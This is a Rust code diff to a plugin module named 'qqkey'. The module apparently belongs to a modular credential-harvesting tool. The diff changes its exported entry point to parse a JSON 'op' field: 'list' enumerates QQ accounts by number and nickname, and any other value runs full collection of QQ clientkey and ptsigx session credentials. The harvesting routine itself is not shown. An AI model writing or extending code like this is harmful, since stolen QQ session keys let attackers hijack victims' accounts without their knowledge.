@@ -15,7 +15,8 @@ pub extern "C" fn module_name() -> *const u8 {
     concat!("qqkey", "\0").as_ptr() as *const u8
 }
 
-/// 入口：忽略输入（本插件无参数），返回 QQ clientkey 采集结果 JSON。
+/// 入口：input 为 JSON，op=="list" 时只列账号（uin+nickname，不取 clientkey），
+/// 否则执行完整采集（clientkey + ptsigx）。
 #[no_mangle]
 pub unsafe extern "system" fn module_main(
     input: *const u8,
@@ -23,8 +24,22 @@ pub unsafe extern "system" fn module_main(
     output: *mut u8,
     output_cap: usize,
 ) -> usize {
-    let _ = (input, input_len);
-    let result = run_async(qq_clientkey::QQClientKey::collect());
+    let input_json = if input.is_null() || input_len == 0 {
+        "{}".to_string()
+    } else {
+        String::from_utf8_lossy(std::slice::from_raw_parts(input, input_len)).to_string()
+    };
+
+    let op = serde_json::from_str::<serde_json::Value>(&input_json)
+        .ok()
+        .and_then(|v| v.get("op").and_then(|o| o.as_str()).map(String::from))
+        .unwrap_or_default();
+
+    let result = if op == "list" {
+        run_async(qq_clientkey::QQClientKey::list())
+    } else {
+        run_async(qq_clientkey::QQClientKey::collect())
+    };
     write_output(&result, output, output_cap)
 }
 
